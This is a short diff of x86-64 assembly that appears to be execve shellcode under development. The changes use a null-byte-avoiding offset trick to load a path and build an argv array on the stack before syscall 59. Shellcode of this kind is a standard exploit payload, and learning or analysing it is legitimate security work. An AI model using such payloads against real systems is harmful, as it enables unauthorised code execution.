@@ -5,13 +5,17 @@ section .text
 
 _start:
 
-	xor rax, rax
-	xor rdi, rdi
-	xor rsi, rsi
-	xor rdx, rdx
+  xor rax, rax
+  xor rdi, rdi
+  xor rdx, rdx
 
-	lea rdi, [rel _pathname + 0x10101010]
-	sub rdi, 0x10101010
+  push rdi
+
+  lea rdi, [rel _pathname + 0x10101010]
+  sub rdi, 0x10101010
+
+  push rdi
+  mov rsi, rsp
 
 	mov al, 59
 
